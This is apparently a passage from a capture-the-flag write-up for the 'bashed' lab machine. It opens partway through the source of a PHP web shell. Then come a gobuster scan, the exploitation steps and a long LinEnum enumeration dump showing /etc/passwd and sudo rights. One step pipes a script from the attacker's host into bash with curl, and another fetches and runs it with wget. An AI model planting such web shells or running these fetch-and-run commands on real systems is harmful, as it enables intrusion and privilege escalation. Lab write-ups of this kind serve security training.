2\u0026gt;\u0026amp;1\u0026#34;)); foreach ($output as $line) { echo htmlentities($line, ENT_QUOTES | ENT_HTML5, \u0026#39;UTF-8\u0026#39;) . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } die(); } else if (!empty($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;]) \u0026amp;\u0026amp; !empty($_POST[\u0026#39;path\u0026#39;])) { $filename = $_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;]; $path = $_POST[\u0026#39;path\u0026#39;]; if ($path != \u0026#34;/\u0026#34;) { $path .= \u0026#34;/\u0026#34;; } if (move_uploaded_file($_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;], $path.$filename)) { echo htmlentities($filename) . \u0026#34; successfully uploaded to \u0026#34; . htmlentities($path); } else { echo \u0026#34;Error uploading \u0026#34; . htmlentities($filename); } die(); } ?\u0026gt;\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; html, body { max-width: 100%; } body { width: 100%; height: 100%; margin: 0; background: #000; } body, .inputtext { font-family: \u0026#34;Lucida Console\u0026#34;, \u0026#34;Lucida Sans Typewriter\u0026#34;, monaco, \u0026#34;Bitstream Vera Sans Mono\u0026#34;, monospace; font-size: 14px; font-style: normal; font-variant: normal; font-weight: 400; line-height: 20px; overflow: hidden; } .console { width: 100%; height: 100%; margin: auto; position: absolute; color: #fff; } .output { width: auto; height: auto; position: absolute; overflow-y: scroll; top: 0; bottom: 30px; left: 5px; right: 0; line-height: 20px; } .input form { position: relative; margin-bottom: 0px; } .username { height: 30px; width: auto; padding-left: 5px; line-height: 30px; float: left; } .input { border-top: 1px solid #333333; width: 100%; height: 30px; position: absolute; bottom: 0; } .inputtext { width: auto; height: 30px; bottom: 0px; margin-bottom: 0px; background: #000; border: 0; float: left; padding-left: 8px; color: #fff; } .inputtext:focus { outline: none; } ::-webkit-scrollbar { width: 12px; } ::-webkit-scrollbar-track { background: #101010; } ::-webkit-scrollbar-thumb { background: #303030; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;console\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;output\u0026#34; id=\u0026#34;output\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;input\u0026#34; id=\u0026#34;input\u0026#34;\u0026gt; \u0026lt;form id=\u0026#34;form\u0026#34; method=\u0026#34;GET\u0026#34; onSubmit=\u0026#34;sendCommand()\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;username\u0026#34; id=\u0026#34;username\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;input class=\u0026#34;inputtext\u0026#34; id=\u0026#34;inputtext\u0026#34; type=\u0026#34;text\u0026#34; name=\u0026#34;cmd\u0026#34; autocomplete=\u0026#34;off\u0026#34; autofocus\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;form id=\u0026#34;upload\u0026#34; method=\u0026#34;POST\u0026#34; style=\u0026#34;display: none;\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;file\u0026#34; id=\u0026#34;filebrowser\u0026#34; onchange=\u0026#39;uploadFile()\u0026#39; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; var username = \u0026#34;\u0026#34;; var hostname = \u0026#34;\u0026#34;; var currentDir = \u0026#34;\u0026#34;; var previousDir = \u0026#34;\u0026#34;; var defaultDir = \u0026#34;\u0026#34;; var commandHistory = []; var currentCommand = 0; var inputTextElement = document.getElementById(\u0026#39;inputtext\u0026#39;); var inputElement = document.getElementById(\u0026#34;input\u0026#34;); var outputElement = document.getElementById(\u0026#34;output\u0026#34;); var usernameElement = document.getElementById(\u0026#34;username\u0026#34;); var uploadFormElement = document.getElementById(\u0026#34;upload\u0026#34;); var fileBrowserElement = document.getElementById(\u0026#34;filebrowser\u0026#34;); getShellInfo(); function getShellInfo() { var request = new XMLHttpRequest(); request.onreadystatechange = function() { if (request.readyState == XMLHttpRequest.DONE) { var parsedResponse = request.responseText.split(\u0026#34;\u0026lt;br\u0026gt;\u0026#34;); username = parsedResponse[0]; hostname = parsedResponse[1]; currentDir = parsedResponse[2].replace(new RegExp(\u0026#34;\u0026amp;sol;\u0026#34;, \u0026#34;g\u0026#34;), \u0026#34;/\u0026#34;); defaultDir = currentDir; usernameElement.innerHTML = \u0026#34;\u0026lt;div style=\u0026#39;color: #ff0000; display: inline;\u0026#39;\u0026gt;\u0026#34;+username+\u0026#34;@\u0026#34;+hostname+\u0026#34;\u0026lt;/div\u0026gt;:\u0026#34;+currentDir+\u0026#34;#\u0026#34;; updateInputWidth(); } }; request.open(\u0026#34;POST\u0026#34;, \u0026#34;\u0026#34;, true); request.setRequestHeader(\u0026#34;Content-type\u0026#34;, \u0026#34;application/x-www-form-urlencoded\u0026#34;); request.send(\u0026#34;cmd=whoami; hostname; pwd\u0026#34;); } function sendCommand() { var request = new XMLHttpRequest(); var command = inputTextElement.value; var originalCommand = command; var originalDir = currentDir; var cd = false; commandHistory.push(originalCommand); switchCommand(commandHistory.length); inputTextElement.value = \u0026#34;\u0026#34;; var parsedCommand = command.split(\u0026#34; \u0026#34;); if (parsedCommand[0] == \u0026#34;cd\u0026#34;) { cd = true; if (parsedCommand.length == 1) { command = \u0026#34;cd \u0026#34;+defaultDir+\u0026#34;; pwd\u0026#34;; } else if (parsedCommand[1] == \u0026#34;-\u0026#34;) { command = \u0026#34;cd \u0026#34;+previousDir+\u0026#34;; pwd\u0026#34;; } else { command = \u0026#34;cd \u0026#34;+currentDir+\u0026#34;; \u0026#34;+command+\u0026#34;; pwd\u0026#34;; } } else if (parsedCommand[0] == \u0026#34;clear\u0026#34;) { outputElement.innerHTML = \u0026#34;\u0026#34;; return false; } else if (parsedCommand[0] == \u0026#34;upload\u0026#34;) { fileBrowserElement.click(); return false; } else { command = \u0026#34;cd \u0026#34;+currentDir+\u0026#34;; \u0026#34; + command; } request.onreadystatechange = function() { if (request.readyState == XMLHttpRequest.DONE) { if (cd) { var parsedResponse = request.responseText.split(\u0026#34;\u0026lt;br\u0026gt;\u0026#34;); previousDir = currentDir; currentDir = parsedResponse[0].replace(new RegExp(\u0026#34;\u0026amp;sol;\u0026#34;, \u0026#34;g\u0026#34;), \u0026#34;/\u0026#34;); outputElement.innerHTML += \u0026#34;\u0026lt;div style=\u0026#39;color:#ff0000; float: left;\u0026#39;\u0026gt;\u0026#34;+username+\u0026#34;@\u0026#34;+hostname+\u0026#34;\u0026lt;/div\u0026gt;\u0026lt;div style=\u0026#39;float: left;\u0026#39;\u0026gt;\u0026#34;+\u0026#34;:\u0026#34;+originalDir+\u0026#34;# \u0026#34;+originalCommand+\u0026#34;\u0026lt;/div\u0026gt;\u0026lt;br\u0026gt;\u0026#34;; usernameElement.innerHTML = \u0026#34;\u0026lt;div style=\u0026#39;color: #ff0000; display: inline;\u0026#39;\u0026gt;\u0026#34;+username+\u0026#34;@\u0026#34;+hostname+\u0026#34;\u0026lt;/div\u0026gt;:\u0026#34;+currentDir+\u0026#34;#\u0026#34;; } else { outputElement.innerHTML += \u0026#34;\u0026lt;div style=\u0026#39;color:#ff0000; float: left;\u0026#39;\u0026gt;\u0026#34;+username+\u0026#34;@\u0026#34;+hostname+\u0026#34;\u0026lt;/div\u0026gt;\u0026lt;div style=\u0026#39;float: left;\u0026#39;\u0026gt;\u0026#34;+\u0026#34;:\u0026#34;+currentDir+\u0026#34;# \u0026#34;+originalCommand+\u0026#34;\u0026lt;/div\u0026gt;\u0026lt;br\u0026gt;\u0026#34; + request.responseText.replace(new RegExp(\u0026#34;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;$\u0026#34;), \u0026#34;\u0026lt;br\u0026gt;\u0026#34;); outputElement.scrollTop = outputElement.scrollHeight; } updateInputWidth(); } }; request.open(\u0026#34;POST\u0026#34;, \u0026#34;\u0026#34;, true); request.setRequestHeader(\u0026#34;Content-type\u0026#34;, \u0026#34;application/x-www-form-urlencoded\u0026#34;); request.send(\u0026#34;cmd=\u0026#34;+encodeURIComponent(command)); return false; } function uploadFile() { var formData = new FormData(); formData.append(\u0026#39;file\u0026#39;, fileBrowserElement.files[0], fileBrowserElement.files[0].name); formData.append(\u0026#39;path\u0026#39;, currentDir); var request = new XMLHttpRequest(); request.onreadystatechange = function() { if (request.readyState == XMLHttpRequest.DONE) { outputElement.innerHTML += request.responseText+\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } }; request.open(\u0026#34;POST\u0026#34;, \u0026#34;\u0026#34;, true); request.send(formData); outputElement.innerHTML += \u0026#34;\u0026lt;div style=\u0026#39;color:#ff0000; float: left;\u0026#39;\u0026gt;\u0026#34;+username+\u0026#34;@\u0026#34;+hostname+\u0026#34;\u0026lt;/div\u0026gt;\u0026lt;div style=\u0026#39;float: left;\u0026#39;\u0026gt;\u0026#34;+\u0026#34;:\u0026#34;+currentDir+\u0026#34;# Uploading \u0026#34;+fileBrowserElement.files[0].name+\u0026#34;...\u0026lt;/div\u0026gt;\u0026lt;br\u0026gt;\u0026#34;; } function updateInputWidth() { inputTextElement.style.width = inputElement.clientWidth - usernameElement.clientWidth - 15; } document.onkeydown = checkForArrowKeys; function checkForArrowKeys(e) { e = e || window.event; if (e.keyCode == \u0026#39;38\u0026#39;) { previousCommand(); } else if (e.keyCode == \u0026#39;40\u0026#39;) { nextCommand(); } } function previousCommand() { if (currentCommand != 0) { switchCommand(currentCommand-1); } } function nextCommand() { if (currentCommand != commandHistory.length) { switchCommand(currentCommand+1); } } function switchCommand(newCommand) { currentCommand = newCommand; if (currentCommand == commandHistory.length) { inputTextElement.value = \u0026#34;\u0026#34;; } else { inputTextElement.value = commandHistory[currentCommand]; setTimeout(function(){ inputTextElement.selectionStart = inputTextElement.selectionEnd = 10000; }, 0); } } document.getElementById(\u0026#34;form\u0026#34;).addEventListener(\u0026#34;submit\u0026#34;, function(event){ event.preventDefault() }); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   Directory Enum 1  gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt   1 2 3 4 5 6 7  /images (Status: 301) [Size: 311] [--\u0026gt; http://10.10.10.68/images/] /uploads (Status: 301) [Size: 312] [--\u0026gt; http://10.10.10.68/uploads/] /php (Status: 301) [Size: 308] [--\u0026gt; http://10.10.10.68/php/] /css (Status: 301) [Size: 308] [--\u0026gt; http://10.10.10.68/css/] /dev (Status: 301) [Size: 308] [--\u0026gt; http://10.10.10.68/dev/] /js (Status: 301) [Size: 307] [--\u0026gt; http://10.10.10.68/js/] /fonts (Status: 301) [Size: 310] [--\u0026gt; http://10.10.10.68/fonts/]   Exploitation 1  git clone https://github.com/rebootuser/LinEnum    Copy the LinEnum.sh to the directory -\u0026gt; https://github.com/carlospolop/PEASS-ng/releases  1  python -m SimpleHTTPServer 80 # In the attacing machine   1 2 3  # In 10.10.10.68/dev/phpbash.php curl 10.10.14.28/LinEnum.sh | bash   1 2 3  which curl # No curl which wget # Yes curl   1  wget 10.10.14.28/LinEnum.sh   1 2 3 4 5  cd /dev/shm wget 10.10.14.28/LinEnum.sh bash LinEnum.sh # To run the command   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 294 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 310 311 312 313 314 315 316 317 318 319 320 321 322 323 324 325 326 327 328 329 330 331 332 333 334 335 336 337 338 339 340 341 342 343 344 345 346 347 348 349 350 351 352 353 354 355 356 357 358 359 360 361 362 363 364 365 366 367 368 369 370 371 372 373 374 375 376 377 378 379 380 381 382 383 384 385 386 387 388 389 390 391 392 393 394 395 396 397 398 399 400 401 402 403 404 405 406 407 408 409 410 411 412 413 414 415 416 417 418 419 420 421 422 423 424 425 426 427 428 429 430 431 432 433 434 435 436 437 438 439 440 441 442 443 444 445 446 447 448 449 450 451 452 453 454 455 456 457 458 459 460 461 462 463 464 465 466 467 468 469 470 471 472 473 474 475 476 477 478 479 480 481 482 483 484 485 486 487 488 489 490 491 492 493 494 495 496 497 498 499 500 501 502 503 504 505 506 507 508 509 510 511 512 513 514 515 516 517 518 519 520 521 522 523 524 525 526 527 528 529 530 531 532 533 534 535 536 537 538 539 540 541 542 543 544 545 546 547 548 549 550 551 552 553 554 555 556 557 558 559 560 561 562 563 564 565 566 567 568 569 570 571 572 573 574 575 576 577 578 579 580 581 582 583 584 585 586 587 588 589 590 591 592 593 594 595 596 597 598 599 600 601 602 603 604 605 606 607 608 609 610 611 612 613 614 615 616 617 618 619 620 621 622 623 624 625 626 627 628 629 630 631 632 633 634 635 636 637 638 639 640 641 642 643 644 645 646 647 648 649 650 651 652 653 654 655 656 657 658 659 660 661 662 663 664 665 666 667 668 669 670 671 672 673 674 675 676 677 678 679 680 681 682 683 684 685 686 687 688 689 690 691 692 693 694 695 696 697 698 699 700 701 702 703 704 705 706 707 708 709 710 711 712 713 714 715 716 717 718 719 720 721 722 723 724 725 726 727 728 729 730 731 732 733 734 735 736 737 738 739 740 741 742 743 744 745 746 747 748 749 750 751 752 753 754 755 756 757 758 759 760 761 762 763 764 765 766 767 768 769 770 771 772 773 774 775 776 777 778 779 780 781 782 783 784 785 786 787 788 789 790 791 792 793 794 795 796 797 798 799 800 801 802 803 804 805 806 807 808 809 810 811 812 813 814 815 816 817 818 819 820 821 822 823 824 825 826 827 828 829 830 831 832 833 834 835 836 837 838 839 840 841 842 843 844 845 846 847 848 849 850 851 852 853 854 855 856 857 858 859 860 861 862 863 864 865 866 867 868 869 870 871 872 873 874 875 876 877 878 879 880 881 882 883 884 885 886 887 888 889 890 891 892 893 894 895 896 897 898 899 900 901 902 903 904 905 906 907 908 909 910 911 912 913 914 915 916 917 918 919 920 921 922 923 924 925 926 927 928 929 930 931 932 933 934 935 936 937 938 939 940 941 942 943 944 945 946 947 948 949 950 951 952 953 954 955 956 957 958 959 960 961 962 963 964 965 966 967 968 969 970 971 972 973 974 975 976 977 978 979 980 981 982 983 984 985 986 987 988 989 990 991 992 993 994 995 996 997 998 999 1000 1001 1002 1003 1004 1005 1006 1007 1008 1009 1010 1011 1012 1013 1014 1015 1016 1017 1018 1019 1020 1021 1022 1023 1024 1025 1026 1027 1028 1029 1030 1031 1032 1033 1034 1035 1036 1037 1038 1039 1040 1041 1042 1043 1044 1045 1046 1047 1048 1049 1050 1051 1052 1053 1054 1055 1056 1057 1058 1059 1060 1061 1062 1063 1064 1065 1066 1067 1068 1069 1070 1071 1072 1073 1074 1075 1076 1077 1078 1079 1080 1081 1082 1083 1084 1085 1086 1087 1088 1089 1090 1091 1092 1093 1094 1095 1096 1097 1098 1099 1100 1101 1102 1103 1104 1105 1106 1107 1108 1109 1110 1111 1112 1113 1114 1115 1116 1117 1118 1119 1120 1121 1122 1123 1124 1125 1126 1127 1128 1129 1130 1131 1132 1133 1134 1135 1136 1137 1138 1139 1140 1141 1142 1143 1144 1145 1146 1147 1148 1149 1150 1151 1152  [00;31m#########################################################[00m [00;31m#[00m [00;33mLocal Linux Enumeration \u0026amp; Privilege Escalation Script[00m [00;31m#[00m [00;31m#########################################################[00m [00;33m# www.rebootuser.com[00m [00;33m# version 0.982[00m [-] Debug Info [00;33m[+] Thorough tests = Disabled[00m [00;33mScan started at: Sat Jan 29 11:39:45 PST 2022 [00m [00;33m### SYSTEM ##############################################[00m [00;31m[-] Kernel information:[00m Linux bashed 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux [00;31m[-] Kernel information (continued):[00m Linux version 4.4.0-62-generic (buildd@lcy01-30) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 [00;31m[-] Specific release information:[00m DISTRIB_ID=Ubuntu DISTRIB_RELEASE=16.04 DISTRIB_CODENAME=xenial DISTRIB_DESCRIPTION=\u0026#34;Ubuntu 16.04.2 LTS\u0026#34; NAME=\u0026#34;Ubuntu\u0026#34; VERSION=\u0026#34;16.04.2 LTS (Xenial Xerus)\u0026#34; ID=ubuntu ID_LIKE=debian PRETTY_NAME=\u0026#34;Ubuntu 16.04.2 LTS\u0026#34; VERSION_ID=\u0026#34;16.04\u0026#34; HOME_URL=\u0026#34;http://www.ubuntu.com/\u0026#34; SUPPORT_URL=\u0026#34;http://help.ubuntu.com/\u0026#34; BUG_REPORT_URL=\u0026#34;http://bugs.launchpad.net/ubuntu/\u0026#34; VERSION_CODENAME=xenial UBUNTU_CODENAME=xenial [00;31m[-] Hostname:[00m bashed [00;33m### USER/GROUP ##########################################[00m [00;31m[-] Current user/group info:[00m uid=33(www-data) gid=33(www-data) groups=33(www-data) [00;31m[-] Users that have previously logged onto the system:[00m Username Port From Latest arrexel tty1 Sat Dec 23 20:20:46 -0800 2017 [00;31m[-] Who else is logged on:[00m 11:39:45 up 1:23, 0 users, load average: 0.00, 0.01, 0.02 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT [00;31m[-] Group memberships:[00m uid=0(root) gid=0(root) groups=0(root) uid=1(daemon) gid=1(daemon) groups=1(daemon) uid=2(bin) gid=2(bin) groups=2(bin) uid=3(sys) gid=3(sys) groups=3(sys) uid=4(sync) gid=65534(nogroup) groups=65534(nogroup) uid=5(games) gid=60(games) groups=60(games) uid=6(man) gid=12(man) groups=12(man) uid=7(lp) gid=7(lp) groups=7(lp) uid=8(mail) gid=8(mail) groups=8(mail) uid=9(news) gid=9(news) groups=9(news) uid=10(uucp) gid=10(uucp) groups=10(uucp) uid=13(proxy) gid=13(proxy) groups=13(proxy) uid=33(www-data) gid=33(www-data) groups=33(www-data) uid=34(backup) gid=34(backup) groups=34(backup) uid=38(list) gid=38(list) groups=38(list) uid=39(irc) gid=39(irc) groups=39(irc) uid=41(gnats) gid=41(gnats) groups=41(gnats) uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup) uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync) uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network) uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve) uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy) uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm) uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup) uid=106(messagebus) gid=110(messagebus) groups=110(messagebus) uid=107(uuidd) gid=111(uuidd) groups=111(uuidd) uid=1000(arrexel) gid=1000(arrexel) groups=1000(arrexel),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare) uid=1001(scriptmanager) gid=1001(scriptmanager) groups=1001(scriptmanager) [00;31m[-] It looks like we have some admin users:[00m uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm) uid=1000(arrexel) gid=1000(arrexel) groups=1000(arrexel),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare) [00;31m[-] Contents of /etc/passwd:[00m root❌0:0:root:/root:/bin/bash daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin bin❌2:2:bin:/bin:/usr/sbin/nologin sys❌3:3:sys:/dev:/usr/sbin/nologin sync❌4:65534:sync:/bin:/bin/sync games❌5:60:games:/usr/games:/usr/sbin/nologin man❌6:12:man:/var/cache/man:/usr/sbin/nologin lp❌7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail❌8:8:mail:/var/mail:/usr/sbin/nologin news❌9:9:news:/var/spool/news:/usr/sbin/nologin uucp❌10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy❌13:13:proxy:/bin:/usr/sbin/nologin www-data❌33:33:www-data:/var/www:/usr/sbin/nologin backup❌34:34:backup:/var/backups:/usr/sbin/nologin list❌38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc❌39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats❌41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody❌65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync❌100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network❌101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve❌102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy❌103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog❌104:108::/home/syslog:/bin/false _apt❌105:65534::/nonexistent:/bin/false messagebus❌106:110::/var/run/dbus:/bin/false uuidd❌107:111::/run/uuidd:/bin/false arrexel❌1000:1000:arrexel,,,:/home/arrexel:/bin/bash scriptmanager❌1001:1001:,,,:/home/scriptmanager:/bin/bash [00;31m[-] Super user account(s):[00m root [00;33m[+] We can sudo without supplying a password![00m Matching Defaults entries for www-data on bashed: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on bashed: (scriptmanager : scriptmanager) NOPASSWD: ALL [00;31m[-] Accounts that have recently used sudo:[00m /home/arrexel/.sudo_as_admin_successful [00;31m[-] Are permissions on /home directories lax:[00m total 16K drwxr-xr-x 4 root root 4.0K Dec 4 2017 . drwxr-xr-x 23 root root 4.0K Dec 4 2017 .. drwxr-xr-x 4 arrexel arrexel 4.0K Dec 4 2017 arrexel drwxr-xr-x 3 scriptmanager scriptmanager 4.0K Dec 4 2017 scriptmanager [00;33m### ENVIRONMENTAL #######################################[00m [00;31m[-] Environment information:[00m APACHE_PID_FILE=/var/run/apache2/apache2.pid APACHE_RUN_USER=www-data APACHE_LOG_DIR=/var/log/apache2 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin PWD=/dev/shm APACHE_RUN_GROUP=www-data LANG=C SHLVL=1 APACHE_LOCK_DIR=/var/lock/apache2 APACHE_RUN_DIR=/var/run/apache2 _=/usr/bin/env [00;31m[-] Path information:[00m /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin drwxr-xr-x 2 root root 4096 Dec 4 2017 /bin drwxr-xr-x 2 root root 4096 Dec 4 2017 /sbin drwxr-xr-x 2 root root 20480 Dec 4 2017 /usr/bin drwxr-xr-x 2 root root 4096 Feb 15 2017 /usr/local/bin drwxr-xr-x 2 root root 4096 Feb 15 2017 /usr/local/sbin drwxr-xr-x 2 root root 4096 Dec 4 2017 /usr/sbin [00;31m[-] Available shells:[00m # /etc/shells: valid login shells /bin/sh /bin/dash /bin/bash /bin/rbash [00;31m[-] Current umask value:[00m 0022 u=rwx,g=rx,o=rx [00;31m[-] umask value as specified in /etc/login.defs:[00m UMASK 022 [00;31m[-] Password and storage information:[00m PASS_MAX_DAYS 99999 PASS_MIN_DAYS 0 PASS_WARN_AGE 7 ENCRYPT_METHOD SHA512 [00;33m### JOBS/TASKS ##########################################[00m [00;31m[-] Cron jobs:[00m -rw-r--r-- 1 root root 722 Apr 5 2016 /etc/crontab /etc/cron.d: total 20 drwxr-xr-x 2 root root 4096 Dec 4 2017 . drwxr-xr-x 89 root root 4096 Dec 4 2017 .. -rw-r--r-- 1 root root 102 Apr 5 2016 .placeholder -rw-r--r-- 1 root root 670 Mar 1 2016 php -rw-r--r-- 1 root root 191 Dec 4 2017 popularity-contest /etc/cron.daily: total 48 drwxr-xr-x 2 root root 4096 Dec 4 2017 . drwxr-xr-x 89 root root 4096 Dec 4 2017 .. -rw-r--r-- 1 root root 102 Apr 5 2016 .placeholder -rwxr-xr-x 1 root root 539 Apr 5 2016 apache2 -rwxr-xr-x 1 root root 1474 Jan 17 2017 apt-compat -rwxr-xr-x 1 root root 355 May 22 2012 bsdmainutils -rwxr-xr-x 1 root root 1597 Nov 26 2015 dpkg -rwxr-xr-x 1 root root 372 May 5 2015 logrotate -rwxr-xr-x 1 root root 1293 Nov 6 2015 man-db -rwxr-xr-x 1 root root 435 Nov 17 2014 mlocate -rwxr-xr-x 1 root root 249 Nov 12 2015 passwd -rwxr-xr-x 1 root root 3449 Feb 26 2016 popularity-contest /etc/cron.hourly: total 12 drwxr-xr-x 2 root root 4096 Dec 4 2017 . drwxr-xr-x 89 root root 4096 Dec 4 2017 .. -rw-r--r-- 1 root root 102 Apr 5 2016 .placeholder /etc/cron.monthly: total 12 drwxr-xr-x 2 root root 4096 Dec 4 2017 . drwxr-xr-x 89 root root 4096 Dec 4 2017 .. -rw-r--r-- 1 root root 102 Apr 5 2016 .placeholder /etc/cron.weekly: total 20 drwxr-xr-x 2 root root 4096 Dec 4 2017 . drwxr-xr-x 89 root root 4096 Dec 4 2017 .. -rw-r--r-- 1 root root 102 Apr 5 2016 .placeholder -rwxr-xr-x 1 root root 86 Apr 13 2016 fstrim -rwxr-xr-x 1 root root 771 Nov 6 2015 man-db [00;31m[-] Crontab contents:[00m # /etc/crontab: system-wide crontab # Unlike any other crontab you don\u0026#39;t have to run the `crontab\u0026#39; # command to install the new version when you edit this file # and files in /etc/cron.d. These files also have username fields, # that none of the other crontabs do. SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin # m h dom mon dow user command 17 * * * * root cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.daily ) 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.monthly ) # [00;31m[-] Anything interesting in /var/spool/cron/crontabs:[00m total 0 d????????? ? ? ? ? ? . d????????? ? ? ? ? ? .. -????????? ? ? ? ? ? root [00;31m[-] Systemd timers:[00m NEXT LEFT LAST PASSED UNIT ACTIVATES Sat 2022-01-29 18:09:40 PST 6h left Sat 2022-01-29 10:15:56 PST 1h 23min ago apt-daily.timer apt-daily.service Sun 2022-01-30 10:30:56 PST 22h left Sat 2022-01-29 10:30:56 PST 1h 8min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service 2 timers listed. [2mEnable thorough tests to see inactive timers[00m [00;33m### NETWORKING ##########################################[00m [00;31m[-] Network and IP info:[00m ens33 Link encap:Ethernet HWaddr 00:50:56:b9:89:fa inet addr:10.10.10.68 Bcast:10.10.10.255 Mask:255.255.255.255 inet6 addr: fe80::250:56ff:feb9:89fa/64 Scope:Link UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:205649 errors:0 dropped:69 overruns:0 frame:0 TX packets:201739 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:32067305 (32.0 MB) TX bytes:99906403 (99.9 MB) lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 inet6 addr: ::1/128 Scope:Host UP LOOPBACK RUNNING MTU:65536 Metric:1 RX packets:26792 errors:0 dropped:0 overruns:0 frame:0 TX packets:26792 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1 RX bytes:1984408 (1.9 MB) TX bytes:1984408 (1.9 MB) [00;31m[-] ARP history:[00m ? (10.10.10.2) at 00:50:56:b9:2e:45 [ether] on ens33 [00;31m[-] Default route:[00m default 10.10.10.2 0.0.0.0 UG 0 0 0 ens33 [00;31m[-] Listening TCP:[00m Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp6 0 0 :::80 :::* LISTEN - [00;31m[-] Listening UDP:[00m Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name [00;33m### SERVICES #############################################[00m [00;31m[-] Running processes:[00m USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND root 1 0.0 0.5 37808 5788 ? Ss 10:15 0:01 /sbin/init noprompt root 2 0.0 0.0 0 0 ? S 10:15 0:00 [kthreadd] root 3 0.0 0.0 0 0 ? S 10:15 0:00 [ksoftirqd/0] root 5 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [kworker/0:0H] root 7 0.0 0.0 0 0 ? S 10:15 0:00 [rcu_sched] root 8 0.0 0.0 0 0 ? S 10:15 0:00 